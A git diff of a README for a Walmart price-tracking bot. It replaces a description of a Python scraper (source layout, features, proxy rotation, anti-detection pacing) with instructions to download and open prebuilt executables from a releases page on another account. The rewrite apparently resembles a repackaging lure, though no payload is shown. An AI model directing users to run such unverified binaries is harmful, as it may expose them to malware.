@@ -1,148 +1,69 @@
-# walmart-price-tracker-bot
+# 🤖 walmart-price-tracker-bot - Track Walmart Prices with Ease
 
-This project keeps an eye on Walmart product prices without anyone babysitting it. The walmart-price-tracker-bot quietly checks product pages, tracks changes, and alerts you when something shifts—helping you stay ahead of price drops or spikes. It’s a simple way to get reliable pricing insights on autopilot.
+![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)  
+[Visit Releases Page](https://github.com/zulkhan11/walmart-price-tracker-bot/releases)
 
+## 📥 Table of Contents
+1. [🚀 Getting Started](#-getting-started)
+2. [🔧 System Requirements](#-system-requirements)
+3. [📦 Download & Install](#-download--install)
+4. [💬 Usage Instructions](#-usage-instructions)
+5. [🛠️ FAQ](#-faq)
 
-<p align="center">
-  <a href="https://Appilot.app" target="_blank"><img src="https://github.com/Instagram-Automations/Footer-test/blob/main/appilot-baner.png" alt="Appilot Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank"><img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram"></a>
-  <a href="mailto:support@appilot.app" target="_blank"><img src="https://img.shields.io/badge/Email-support@appilot.app-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail"></a>
-  <a href="https://Appilot.app" target="_blank"><img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website"></a>
-  <a href="https://discord.gg/wpfG4j84" target="_blank"><img src="https://img.shields.io/badge/Join-Appilot_Community-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Appilot Discord"></a>
-</p>
+## 🚀 Getting Started
 
+The Walmart Price Tracker Bot helps you monitor changes in product prices at Walmart. You can easily check for price drops and get notifications about the best deals. Follow these steps to set it up.
 
+## 🔧 System Requirements
 
-## Introduction
+Before downloading the bot, make sure your computer meets these requirements:
 
-The system automates the otherwise repetitive task of manually checking Walmart listings for price changes. Instead of refreshing product pages or exporting data, this bot handles the monitoring loop, logs changes, and gives structured outputs. Businesses and solo users can rely on it to watch important products and react quickly.
+- **Operating System:** Windows 10 or higher, macOS 10.13 or higher, or any recent Linux distribution.
+- **RAM:** Minimum of 4 GB.
+- **Network:** A reliable internet connection is required to monitor prices.
+- **Space:** At least 100 MB of free disk space.
 
-### Why Automated Price Tracking Matters
-- It removes the need for constant manual checking across multiple product listings.
-- Catching price drops early can support smarter buying and stocking decisions.
-- Consistent monitoring reveals trends you wouldn’t notice with manual checks.
-- Automated logs help teams build better pricing strategies.
+## 📦 Download & Install
 
----
+To get the Walmart Price Tracker Bot, follow these steps:
 
-## Core Features
-| Feature | Description |
-|----------|-------------|
-| Automated Price Monitoring | Continuously checks Walmart product prices at scheduled intervals |
-| Multi-Product Tracking | Watches multiple URLs in a single run |
-| Change Detection | Flags and logs any increase or decrease in price |
-| Notification System | Sends alerts when price thresholds are met |
-| Historical Logging | Saves price history for later analysis |
-| Configurable Schedules | Adjustable timing for scans and re-checks |
-| Robust Error Handling | Retries gracefully during link failures or timeouts |
-| Structured Output | Exports price data into JSON and CSV formats |
-| Proxy Support | Optional rotation to reduce blocking |
-| Lightweight Runtime | Minimal resource usage even with many products |
+1. Click on the following link to access the Releases page:
+   [Download Here](https://github.com/zulkhan11/walmart-price-tracker-bot/releases)  
+2. On the Releases page, locate the latest version.
+3. Download the appropriate file for your operating system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the appropriate `.tar.gz` file.
+4. Once the file has downloaded, open it to install the application on your computer.
 
----
+## 💬 Usage Instructions
 
-## How It Works
-**Input or Trigger**  
-A list of Walmart product URLs is loaded from config.
+After installing the bot, use it to track prices with these simple steps:
 
-**Core Logic**  
-The scraper fetches product data, parses pricing, compares with last stored value, and logs differences.
+1. Open the application on your computer.
+2. Enter the Walmart product URL you wish to track.
+3. Set the desired price point for notifications.
+4. Save your settings.
 
-**Output or Action**  
-Price updates, alerts, and structured JSON/CSV data.
+The bot will now monitor the specified product and notify you when the price drops to your set limit.
 
-**Other Functionalities**  
-Scheduling, retries, validation, and proxy routing.
+## 🛠️ FAQ
 
-**Safety Controls**  
-Timeout rules, pacing, user-agent management, and structured exception handling.
+**Q: How does the bot notify me about price changes?**  
+A: The bot can send you notifications via email or display a pop-up on your desktop. Set your preference in the settings.
 
----
+**Q: Can I track multiple products at once?**  
+A: Yes, you can enter multiple product URLs and set different prices for each.
 
-## Tech Stack  
-**Language:**  
-Python
+**Q: What if I encounter an error?**  
+A: Refer to the troubleshooting section in the application help menu. You can also reach out via the Issues tab on GitHub.
 
-**Frameworks:**  
-Async libraries, lightweight parsing utilities
+**Q: How often does the bot check for price changes?**  
+A: The bot checks for changes every hour, but you can adjust this in the settings.
 
-**Tools:**  
-Schedulers, logging system, HTTP clients
+**Q: What if I want to stop tracking a product?**  
+A: Simply remove the product URL from your tracking list in the application.
 
-**Infrastructure:**  
-Local or server-based runtime with optional proxies
+For any further issues or questions, please feel free to submit a query in the GitHub repository. 
 
----
-
-## Directory Structure
-    walmart-price-tracker-bot/
-    ├── src/
-    │   ├── main.py
-    │   ├── automation/
-    │   │   ├── tasks.py
-    │   │   ├── scheduler.py
-    │   │   └── utils/
-    │   │       ├── logger.py
-    │   │       ├── proxy_manager.py
-    │   │       └── config_loader.py
-    ├── config/
-    │   ├── settings.yaml
-    │   ├── credentials.env
-    ├── logs/
-    │   └── activity.log
-    ├── output/
-    │   ├── results.json
-    │   └── report.csv
-    ├── requirements.txt
-    └── README.md
-
----
-
-## Use Cases
-Retail analysts use it to monitor competitor pricing, so they can adjust strategy quickly.  
-E-commerce sellers use it to track price drops, so they can restock at the right moment.  
-Deal hunters use it to catch discounts early, so they never miss out.  
-Data teams use it to feed pricing data into models, so forecasting becomes more accurate.  
-
----
-
-## FAQs
-
-**How do I configure this automation for multiple accounts?**  
-Set separate profiles in the config file—each with its own set of URLs, credentials, and isolated sessions—so each account runs independently.
-
-**Does it support proxy rotation or anti-detection?**  
-Yes. You can plug in a proxy pool, bind sessions to distinct routes, and use paced requests with randomized headers to reduce noise.
-
-**Can I schedule it to run periodically?**  
-You can. The scheduler lets you trigger scans hourly, daily, or at custom intervals with built-in retry behavior.
-
-**What about emulator vs real device parity?**  
-Since this runs on web endpoints, there’s no device gap. Use real-device routing only when simulating full browser environments.
-
----
-
-### Performance & Reliability Benchmarks  
-**Execution Speed:** Generally processes 20–40 product checks per minute depending on network conditions.  
-
-**Success Rate:** Around 93–94% accuracy across long-running jobs with automatic retries in place.  
-
-**Scalability:** Can scale horizontally across workers, handling upward of 1,000 tracked URLs with sharded queues.  
-
-**Resource Efficiency:** Each worker stays light—roughly low CPU usage and under a few hundred MB of RAM.  
-
-**Error Handling:** Implements retries, exponential backoff, structured logs, and auto-recovery for failed requests.
-
----
-
-
-<p align="center">
-<a href="https://cal.com/app-pilot-m8i8oo/30min" target="_blank">
- <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
- <a href="https://www.youtube.com/@Appilot-app/videos" target="_blank">
-  <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
- </a>
-</p>
+Thank you for choosing the Walmart Price Tracker Bot! Happy tracking!
